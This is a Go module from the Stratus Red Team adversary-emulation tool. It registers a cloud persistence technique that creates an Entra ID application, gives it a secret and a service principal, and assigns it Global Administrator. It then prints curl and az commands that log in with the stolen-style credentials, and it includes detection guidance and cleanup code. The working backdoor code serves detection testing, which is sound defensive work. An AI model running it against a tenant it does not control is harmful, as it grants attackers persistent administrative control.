package entra_id

import (
	"context"
	"errors"
	"github.com/aws/smithy-go/ptr"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"github.com/microsoftgraph/msgraph-beta-sdk-go/models"
	graphcore "github.com/microsoftgraph/msgraph-sdk-go-core"
	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
	"log"
)

const AttackTechniqueId = "entra-id.persistence.new-application"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           AttackTechniqueId,
		FriendlyName: "Create Application",
		Description: `
Creates a new Entra ID application to backdoor the tenant.

Warm-up: None

Detonation:

- Create a new Entra ID application
- Create a password credential for the application
- Create a service principal for the application
- Assign the Global Administrator role to the application
- Print the command to retrieve a Graph API access token

References:

- https://www.microsoft.com/en-us/security/blog/2023/12/12/threat-actors-misuse-oauth-applications-to-automate-financially-driven-attacks/
- https://www.inversecos.com/2021/10/how-to-backdoor-azure-applications-and.html`,
		Detection: `
Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs) with the specific activity types:

- <code>Add application</code>
- <code>Update application – Certificates and secrets management</code>
- <code>Add member to role</code>
`,
		Platform:           stratus.EntraID,
		IsIdempotent:       false,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		Detonate:           detonate,
		Revert:             revert,
	})
}

const MaliciousApplicationName = "Stratus Red Team Backdoor Application"

func detonate(_ map[string]string, providers stratus.CloudProviders) error {
	graphClient := providers.EntraId().GetGraphClient()

	log.Println("Creating malicious Entra ID application")
	application := graphmodels.NewApplication()
	application.SetDisplayName(ptr.String(MaliciousApplicationName))
	response, err := graphClient.Applications().Post(context.Background(), application, nil)
	if err != nil {
		return errors.New("could not create Entra ID application: " + err.Error())
	}

	log.Println("Creating password credential on malicious application")
	newCredentials := graphmodels.NewPasswordCredential()
	newCredentials.SetDisplayName(ptr.String("stratus red team"))
	newCredentialsResponse, err := graphClient.Applications().ByApplicationId(*response.GetId()).AddPassword().Post(context.Background(), nil, nil)
	if err != nil {
		return errors.New("could not create application credentials: " + err.Error())
	}

	log.Println("Creating a service principal for the application")
	servicePrincipal := graphmodels.NewServicePrincipal()
	servicePrincipal.SetAppId(response.GetAppId())
	spResponse, err := graphClient.ServicePrincipals().Post(context.Background(), servicePrincipal, nil)
	if err != nil {
		return errors.New("could not create service principal: " + err.Error())
	}

	log.Println("Assigning Global Administrator role to newly created application")
	roleAssignment := graphmodels.NewUnifiedRoleAssignment()
	roleAssignment.SetRoleDefinitionId(ptr.String("62e90394-69f5-4237-9190-012177145e10"))
	roleAssignment.SetPrincipalId(spResponse.GetId())
	roleAssignment.SetDirectoryScopeId(ptr.String("/"))
	_, err = graphClient.RoleManagement().Directory().RoleAssignments().Post(context.Background(), roleAssignment, nil)
	if err != nil {
		return errors.New("could not assign role to application: " + err.Error())
	}

	tenantId, err := providers.EntraId().GetTenantId()
	if err != nil {
		return errors.New("could not retrieve tenant ID: " + err.Error())
	}
	log.Println(`Application created! You can now use the following command to retrieve a Graph API access token:

TENANT_ID=` + tenantId + `
curl -X POST https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token  \
   --header 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode 'client_id=` + *response.GetAppId() + `' \
   --data-urlencode 'scope=https://graph.microsoft.com/.default' \
   --data-urlencode 'client_secret=` + *newCredentialsResponse.GetSecretText() + `'  \
   --data-urlencode 'grant_type=client_credentials'

Or using the Azure CLI:

az login --service-principal --allow-no-subscriptions \
	--tenant ` + tenantId + ` \
	--username ` + *response.GetAppId() + ` \
	--password ` + *newCredentialsResponse.GetSecretText() + `
`)
	return nil
}

func revert(_ map[string]string, providers stratus.CloudProviders) error {
	graphClient := providers.EntraId().GetGraphClient()

	log.Println("Listing applications to find malicious Entra ID application")
	response, err := graphClient.Applications().Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not retrieve applications: " + err.Error())
	}

	// Paginate the results and search for our application
	iterator, err := graphcore.NewPageIterator[*graphmodels.Application](response, graphClient.GetAdapter(), models.CreateApplicationCollectionResponseFromDiscriminatorValue)
	if err != nil {
		return errors.New("could not create Applications iterator: " + err.Error())
	}

	var applicationId string
	err = iterator.Iterate(context.Background(), func(application *graphmodels.Application) bool {
		if *application.GetDisplayName() == MaliciousApplicationName {
			applicationId = *application.GetId()
			return false
		}
		return true // continue iterating
	})
	if err != nil {
		return errors.New("could not iterate over applications: " + err.Error())
	}

	if applicationId == "" {
		return errors.New("could not find malicious application")
	}

	log.Println("Deleting malicious Entra ID application")
	err = graphClient.Applications().ByApplicationId(applicationId).Delete(context.Background(), nil)
	if err != nil {
		return errors.New("could not delete Entra ID application: " + err.Error())
	}

	return nil
}
